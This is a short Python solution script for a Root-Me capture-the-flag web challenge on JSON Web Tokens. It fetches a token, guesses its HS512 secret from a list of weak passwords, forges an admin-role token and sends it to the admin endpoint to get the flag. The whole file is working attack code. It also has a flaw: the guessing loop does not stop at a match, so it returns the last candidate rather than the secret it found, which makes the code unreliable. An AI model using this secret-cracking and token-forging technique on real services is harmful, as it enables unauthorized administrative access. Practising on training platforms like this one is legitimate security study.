#

import json

import jwt
import requests
from jwt.exceptions import InvalidSignatureError


def get_token() -> str:
    response = requests.get("http://challenge01.root-me.org/web-serveur/ch59/token")
    token = json.loads(response.text)["Here is your token"]

    return token


def get_flag(hacked_token: str) -> str:
    response = requests.post(
        "http://challenge01.root-me.org/web-serveur/ch59/admin",
        headers={"Authorization": f"Bearer {hacked_token}"},
    )
    flag = json.loads(response.text)["result"]

    return flag


def brute_secret(token) -> str:
    weak_secrets = [
        "secret",
        "admin",
        "weak-secret",
        "super-crypto",
        "super-secret",
        "lol",
        "super-crypto-secret",
    ]

    for secret in weak_secrets:
        try:
            jwt.decode(token, secret, algorithms=["HS512"])
            print(f"Secret is {secret}!")

        except InvalidSignatureError:
            continue

    return secret


def hack_token(secret: str) -> str:
    hacked_token = jwt.encode({"role": "admin"}, secret, algorithm="HS512")

    return hacked_token


def main() -> None:
    jsonwebtoken = get_token()
    secret = brute_secret(jsonwebtoken)
    hacked_token = hack_token(secret)
    flag = get_flag(hacked_token)

    print(flag)


if __name__ == "__main__":
    main()
